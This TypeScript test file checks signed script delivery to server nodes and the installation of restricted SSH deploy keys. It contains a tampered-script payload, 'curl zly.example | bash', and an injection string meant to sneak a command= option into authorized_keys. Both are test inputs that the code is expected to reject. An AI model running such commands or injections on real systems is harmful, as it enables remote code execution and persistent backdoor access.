import { execFile } from 'child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'fs';
import { createServer, type Server } from 'http';
import { tmpdir } from 'os';
import { join } from 'path';
import type { AddressInfo } from 'net';
import { linijkaAuthorizedKeys, kluczPublicznyPem, podpisz, renderVerrisFetchScript } from './podpis-skryptow.js';
import { renderNodeDeploySshKeyInstallFunctions } from './node-tasks-agent.install.js';

/**
 * PB-36 — węzeł uruchamia tylko to, co podpisał control-plane. Test przepuszcza prawdziwy
 * verris-fetch (bash + curl + openssl) przez lokalny serwer podpisujący jak API.
 */
const DIR = mkdtempSync(join(tmpdir(), 'pb36-'));
const FETCH = join(DIR, 'verris-fetch');
const PUB = join(DIR, 'pub.pem');
const ID = 'srv-1';
const SKRYPT = '#!/usr/bin/env bash\necho "zadanie"\n';

type Tryb = 'ok' | 'zmieniona-tresc' | 'inna-sciezka' | 'stary' | 'inny-wezel' | 'bez-podpisu';
let tryb: Tryb = 'ok';
let srv: Server;

function uruchom(args: string[], env: Record<string, string> = {}): Promise<{ rc: number; out: string }> {
  return new Promise((ok) => {
    execFile('bash', args, { env: { ...process.env, VERRIS_CONF: join(DIR, 'verris.conf'), VERRIS_SIG_PUB: PUB, ...env } }, (e, out) =>
      ok({ rc: e ? Number((e as { code?: number }).code ?? 1) : 0, out }),
    );
  });
}

beforeAll(async () => {
  srv = createServer((req, res) => {
    if (req.url === '/agent/tasks/brak') return void res.writeHead(404).end();
    const sciezka = tryb === 'inna-sciezka' ? '/agent/tasks/wp-install/script' : req.url!;
    const ts = Math.floor(Date.now() / 1000) - (tryb === 'stary' ? 600 : 0);
    const { podpis } = podpisz(sciezka, tryb === 'inny-wezel' ? 'srv-2' : ID, SKRYPT, ts);
    if (tryb !== 'bez-podpisu') {
      res.setHeader('X-Verris-Signature', podpis);
      res.setHeader('X-Verris-Signed-At', String(ts));
    }
    res.end(tryb === 'zmieniona-tresc' ? SKRYPT + 'curl zly.example | bash\n' : SKRYPT);
  });
  await new Promise<void>((ok) => srv.listen(0, '127.0.0.1', ok));
  const port = (srv.address() as AddressInfo).port;
  writeFileSync(join(DIR, 'verris.conf'), `VERRIS_API_URL="http://127.0.0.1:${port}"\nVERRIS_SERVER_ID="${ID}"\nVERRIS_IDENTITY_TOKEN="t"\n`);
  writeFileSync(PUB, kluczPublicznyPem());
  writeFileSync(FETCH, renderVerrisFetchScript());
});
afterAll(() => srv.close());

describe('PB-36 — podpisane skrypty węzła', () => {
  it('poprawny podpis: plik zapisany 1:1', async () => {
    tryb = 'ok';
    const cel = join(DIR, 'ok.sh');
    expect((await uruchom([FETCH, '/agent/tasks/node-update/script', cel])).rc).toBe(0);
    expect(readFileSync(cel, 'utf8')).toBe(SKRYPT);
  });

  it.each<Tryb>(['zmieniona-tresc', 'inna-sciezka', 'stary', 'inny-wezel', 'bez-podpisu'])('%s → odrzucony (kod 3), nic nie zapisane', async (t) => {
    tryb = t;
    const cel = join(DIR, `${t}.sh`);
    expect((await uruchom([FETCH, '/agent/tasks/node-update/script', cel])).rc).toBe(3);
    expect(() => readFileSync(cel)).toThrow();
  });

  it('brak klucza publicznego → kod 2; 404 → kod 4', async () => {
    tryb = 'ok';
    expect((await uruchom([FETCH, '/agent/tasks/x', '-'], { VERRIS_SIG_PUB: join(DIR, 'nie-ma.pem') })).rc).toBe(2);
    expect((await uruchom([FETCH, '/agent/tasks/brak', '-'])).rc).toBe(4);
  });

  it('klucz deploy: tylko z from= control-plane, wpis zastępuje stare zamiast dopisywać', async () => {
    const stary = process.env.VERRIS_CONTROL_PLANE_IPS;
    process.env.VERRIS_CONTROL_PLANE_IPS = '203.0.113.10, 2001:db8::/64';
    const k1 = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKey1 ops@cp';
    const k2 = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKey2 ops@cp';
    const l1 = linijkaAuthorizedKeys(k1)!;
    const l2 = linijkaAuthorizedKeys(k2)!;
    expect(l1).toBe('from="203.0.113.10,2001:db8::/64",no-agent-forwarding,no-port-forwarding,no-X11-forwarding,no-user-rc ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKey1 verris-control-plane');

    const ak = join(DIR, 'ssh', 'authorized_keys');
    const last = join(DIR, 'deploy-key.last');
    await uruchom(['-c', `mkdir -p ${DIR}/ssh; printf 'ssh-ed25519 AAAAosobisty admin\\n${k1}\\n' > ${ak}`]);
    const fn = join(DIR, 'fn.sh');
    writeFileSync(fn, `${renderNodeDeploySshKeyInstallFunctions()}\ninstall_verris_deploy_ssh_key "$1"\n`);
    const env = { VERRIS_AUTHORIZED_KEYS: ak, VERRIS_DEPLOY_KEY_LAST: last };
    await uruchom([fn, l1], env);
    expect(readFileSync(ak, 'utf8')).toBe(`ssh-ed25519 AAAAosobisty admin\n${l1}\n`);
    await uruchom([fn, l2], env); // rotacja
    expect(readFileSync(ak, 'utf8')).toBe(`ssh-ed25519 AAAAosobisty admin\n${l2}\n`);
    expect((await uruchom([fn, k2], env)).rc).toBe(1); // bez from= — odmowa
    expect(readFileSync(ak, 'utf8')).toBe(`ssh-ed25519 AAAAosobisty admin\n${l2}\n`);

    process.env.VERRIS_CONTROL_PLANE_IPS = '1.2.3.4",command="sh';
    expect(() => linijkaAuthorizedKeys(k1)).toThrow();
    process.env.VERRIS_CONTROL_PLANE_IPS = '';
    expect(linijkaAuthorizedKeys(k1)).toBeNull();
    if (stary === undefined) delete process.env.VERRIS_CONTROL_PLANE_IPS;
    else process.env.VERRIS_CONTROL_PLANE_IPS = stary;
  });
});
